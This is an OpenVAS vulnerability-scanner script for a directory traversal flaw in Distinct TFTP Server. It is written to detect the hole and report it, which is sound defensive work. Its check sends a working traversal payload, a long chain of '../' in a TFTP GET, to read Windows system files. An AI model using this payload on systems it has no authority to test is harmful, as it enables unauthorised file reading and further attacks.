###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_distinct_tftp_server_dir_trav_vuln.nasl 7582 2017-10-26 11:56:51Z cfischer $
#
# Distinct TFTP Server Directory Traversal Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802623");
  script_bugtraq_id(52938);
  script_version("$Revision: 7582 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 13:56:51 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2012-04-09 15:15:15 +0530 (Mon, 09 Apr 2012)");
  script_name("Distinct TFTP Server Directory Traversal Vulnerability");

  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52938");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18718");
  script_xref(name : "URL" , value : "http://www.spentera.com/advisories/2012/SPN-01-2012.pdf");

  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Remote file access");
  script_dependencies("tftpd_detect.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);

  script_tag(name : "impact" , value : "Successful exploitation allows an attacker to obtain sensitive
  information and launch further attacks.

  Impact Level: Application");
  script_tag(name : "affected" , value : "Distinct TFTP Server version 3.01 and prior");
  script_tag(name : "insight" , value : "The flaw is caused due an input validation error within the TFTP
  service and can be exploited to download or manipulate files in arbitrary locations outside the
  TFTP root via specially crafted directory traversal sequences.");
  script_tag(name : "solution" , value : "Upgrade to Distinct TFTP Server version 3.11 or later.
  For updates refer to http://www.distinct.com");
  script_tag(name : "summary" , value : "This host is running Distinct TFTP Server and is prone to
  directory traversal vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("tftp.inc");
include("network_func.inc");

## Variable Initialization
port = 0;
res = "";

## Check for tftp service
port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## Check Port State
if(!check_udp_port_status(dport:port)){
  exit(0);
}

files = traversal_files("windows");

foreach file(keys(files)) {

  ## Try Directory traversal Attack
  res = tftp_get(path:"../../../../../../../../../../../../../../" + files[file],
                 port:port);

  ## Confirm exploit worked by checking the response
  if(egrep(pattern:file, string:res, icase:TRUE)){
    security_message(port:port);
    exit(0);
  }
}

exit(99);